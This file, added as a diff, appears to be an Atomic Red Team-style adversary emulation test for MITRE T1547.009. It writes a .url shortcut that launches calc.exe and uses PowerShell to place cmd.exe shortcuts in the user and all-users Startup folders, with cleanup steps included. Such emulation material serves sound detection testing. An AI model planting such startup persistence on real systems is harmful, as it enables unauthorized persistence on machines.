@@ -1,0 +1,53 @@
+attack_technique: T1547.009
+display_name: 'Boot or Logon Autostart Execution: Shortcut Modification'
+atomic_tests:
+- name: Shortcut Modification
+  auto_generated_guid: ce4fc678-364f-4282-af16-2fb4c78005ce
+  description: |
+    This test to simulate shortcut modification and then execute. example shortcut (*.lnk , .url) strings check with powershell;
+    gci -path "C:\Users" -recurse -include *.url -ea SilentlyContinue | Select-String -Pattern "exe" | FL.
+    Upon execution, calc.exe will be launched.
+  supported_platforms:
+  - windows
+  input_arguments:
+    shortcut_file_path:
+      description: shortcut modified and execute
+      type: path
+      default: '%temp%\T1547.009_modified_shortcut.url'
+  executor:
+    command: |
+      echo [InternetShortcut] > #{shortcut_file_path}
+      echo URL=C:\windows\system32\calc.exe >> #{shortcut_file_path}
+      #{shortcut_file_path}
+    cleanup_command: |
+      del -f #{shortcut_file_path} >nul 2>&1
+    name: command_prompt
+- name: Create shortcut to cmd in startup folders
+  auto_generated_guid: cfdc954d-4bb0-4027-875b-a1893ce406f2
+  description: |
+    LNK file to launch CMD placed in startup folder. Upon execution, open File Explorer and browse to "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
+    to view the new shortcut.
+  supported_platforms:
+  - windows
+  executor:
+    command: |
+      $Shell = New-Object -ComObject ("WScript.Shell")
+      $ShortCut = $Shell.CreateShortcut("$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\T1547.009.lnk")
+      $ShortCut.TargetPath="cmd.exe"
+      $ShortCut.WorkingDirectory = "C:\Windows\System32";
+      $ShortCut.WindowStyle = 1;
+      $ShortCut.Description = "T1547.009.";
+      $ShortCut.Save()
+
+      $Shell = New-Object -ComObject ("WScript.Shell")
+      $ShortCut = $Shell.CreateShortcut("$env:ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\T1547.009.lnk")
+      $ShortCut.TargetPath="cmd.exe"
+      $ShortCut.WorkingDirectory = "C:\Windows\System32";
+      $ShortCut.WindowStyle = 1;
+      $ShortCut.Description = "T1547.009.";
+      $ShortCut.Save()
+    cleanup_command: |
+      Remove-Item "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\T1547.009.lnk" -ErrorAction Ignore
+      Remove-Item "$env:ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\T1547.009.lnk" -ErrorAction Ignore
+    name: powershell
+    elevation_required: true
